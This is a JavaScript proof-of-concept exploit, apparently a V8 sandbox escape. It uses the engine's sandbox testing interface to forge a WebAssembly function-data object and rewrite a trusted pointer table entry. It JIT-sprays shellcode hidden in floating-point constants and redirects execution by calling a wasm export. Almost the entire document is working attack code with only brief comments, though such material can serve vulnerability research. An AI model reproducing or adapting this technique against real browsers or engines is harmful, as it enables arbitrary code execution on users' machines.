function dp(x){} // { %DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
	return __dvCvt.getUint32(0, true) +
		__dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{ //Uint64 ==> double
	const tmp0 = val % 0x100000000;
	__dvCvt.setUint32(0, tmp0, true);
	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
	return __dvCvt.getFloat64(0, true);
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
const wmain = getWMain();

const high32 = Sandbox.H32BinaryAddress / 0x100000000;

// Function for controlling 6 bytes in the trusted region.
let s = "function foo() { var o = 0x1;";
for (let i = 0; i < high32; ++i)
	s += "o += 1;";
s += "return o + -0x1fffed3e; }" // 0x20000000 - offset to jump (0x12c2)
eval(s);
foo();

// JIT function for the shellcode.
function bar(x)
{
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x40000; ++i)
	bar(i + 0.1);

// Initialize the buffer for faking `WasmExportedFunctionData`.
const arr = Array(0x1000);
arr[0] = 1.1;
for (let i = 1; i < 0x1000; ++i)
	arr[i] = 0.0;

// Obtain the address to the buffer.
const sbxMemView = new DataView(new Sandbox.MemoryView(0, 0xfffffff8));
const fakeAddr = Sandbox.base + sbxMemView.getUint32(
	Sandbox.getAddressOf(arr) + 8, true) - 1 + 8;

// Fake the `WasmExportedFunctionData` instance.
arr[0] = u2d(0x1e15);
arr[2] = u2d((0xe528e-7*0x5555+7*high32+1-0x14+1+1) * 0x100000000);
arr[4] = u2d(0x00199fa1);
arr[6] = u2d(fakeAddr + 0x100);

// Modify the entry to our faked object.
Sandbox.modifyTrustedPointerTable(
	0x2004 << 9, 0x002d000000000000 + fakeAddr + 1, 0x1);

print(hex(fakeAddr));
wmain();